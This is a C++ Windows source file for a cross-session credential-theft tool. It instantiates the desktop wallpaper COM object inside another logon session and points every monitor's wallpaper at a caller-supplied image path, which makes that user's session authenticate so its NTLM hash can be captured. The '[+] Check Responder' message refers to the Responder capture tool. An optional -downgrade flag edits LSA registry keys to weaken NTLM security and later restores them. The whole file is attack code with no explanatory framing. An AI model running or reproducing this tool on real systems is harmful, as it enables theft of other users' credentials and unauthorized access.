#include <windows.h>
#include <shlobj.h>
#include <exdisp.h>
#include <mshtml.h>
#include <iostream>
#include <atlbase.h>
#include <strsafe.h>
#include <stdio.h>
#include <winreg.h>
#include <stdint.h>

HRESULT CoCreateInstanceInSession(DWORD session, REFCLSID rclsid, REFIID riid, void** ppv) {
    BIND_OPTS3 bo = {};
    WCHAR wszCLSID[50];
    WCHAR wszMonikerName[300];
    StringFromGUID2(rclsid, wszCLSID, _countof(wszCLSID));
    StringCchPrintf(wszMonikerName, _countof(wszMonikerName),
        L"session:%d!new:%s", session, wszCLSID);
    bo.cbStruct = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    return CoGetObject(wszMonikerName, &bo, riid, ppv);
}

void GetRegKey(const wchar_t* path, const wchar_t* key, DWORD* oldValue) {
    HKEY hKey;
    DWORD value;
    DWORD valueSize = sizeof(DWORD);


    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, key, NULL, NULL, (LPBYTE)&value, &valueSize);
        RegCloseKey(hKey);
        *oldValue = value;
    }
    else {
        printf("Error reading registry key.\n");
    }
}

void SetRegKey(const wchar_t* path, const wchar_t* key, DWORD newValue) {
    HKEY hKey;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, key, 0, REG_DWORD, (const BYTE*)&newValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    else {
        printf("Error writing registry key.\n");
    }
}

void ExtendedNTLMDowngrade(DWORD* oldValue_LMCompatibilityLevel, DWORD* oldValue_NtlmMinClientSec, DWORD* oldValue_RestrictSendingNTLMTraffic) {
    GetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa", L"LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa", L"LMCompatibilityLevel", 2);

    GetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"NtlmMinClientSec", oldValue_NtlmMinClientSec);
    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"NtlmMinClientSec", 536870912);

    GetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"RestrictSendingNTLMTraffic", 0);
}

void NTLMRestore(DWORD oldValue_LMCompatibilityLevel, DWORD oldValue_NtlmMinClientSec, DWORD oldValue_RestrictSendingNTLMTraffic) {
    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa", L"LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"NtlmMinClientSec", oldValue_NtlmMinClientSec);
    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3 || argc > 4) {
        std::wcerr << L"Usage: " << argv[0] << L" <session> <image_path> [-downgrade]" << std::endl;
        return 1;
    }

    bool downgrade = false;
    if (argc == 4 && wcscmp(argv[3], L"-downgrade") == 0) {
        downgrade = true;
    }

    DWORD oldValue_LMCompatibilityLevel = 0;
    DWORD oldValue_NtlmMinClientSec = 0;
    DWORD oldValue_RestrictSendingNTLMTraffic = 0;

    if (downgrade) {
        ExtendedNTLMDowngrade(&oldValue_LMCompatibilityLevel, &oldValue_NtlmMinClientSec, &oldValue_RestrictSendingNTLMTraffic);
    }

    DWORD session = _wtoi(argv[1]);
    const wchar_t* imagePath = argv[2];

    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        std::wcerr << L"CoInitialize failed with error: " << hr << std::endl;
        return 1;
    }

    CLSID clsidShellWindows;
    hr = CLSIDFromString(OLESTR("{C2CF3110-460E-4FC1-B9D0-8A1C0C9CC4BD}"), &clsidShellWindows);
    if (FAILED(hr)) {
        std::wcerr << L"CLSIDFromString failed with error: " << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    IID iidIShellWindows;
    hr = IIDFromString(OLESTR("{B92B56A9-8B55-4E14-9A89-0199BBB6F93B}"), &iidIShellWindows);
    if (FAILED(hr)) {
        std::wcerr << L"IIDFromString failed with error: " << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    IDesktopWallpaper* pDesktopWallpaper = nullptr;
    hr = CoCreateInstanceInSession(session, clsidShellWindows, iidIShellWindows, (void**)&pDesktopWallpaper);
    if (FAILED(hr)) {
        std::wcerr << L"CoCreateInstanceInSession failed with error: " << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    UINT monitorCount;
    hr = pDesktopWallpaper->GetMonitorDevicePathCount(&monitorCount);
    if (FAILED(hr)) {
        std::wcerr << L"GetMonitorDevicePathCount failed with error: " << hr << std::endl;
        pDesktopWallpaper->Release();
        CoUninitialize();
        return 1;
    }

    for (UINT i = 0; i < monitorCount; i++) {
        LPWSTR monitorId;
        hr = pDesktopWallpaper->GetMonitorDevicePathAt(i, &monitorId);

        if (FAILED(hr)) {
            std::wcerr << L"GetMonitorDevicePathAt failed with error: " << hr << std::endl;
            continue;
        }

        hr = pDesktopWallpaper->SetWallpaper(monitorId, imagePath);
        std::wcout << L"[+] Check Responder" << std::endl;

        CoTaskMemFree(monitorId);
    }

    pDesktopWallpaper->Release();
    CoUninitialize();

    if (downgrade) {
        NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
    }

    return 0;
}
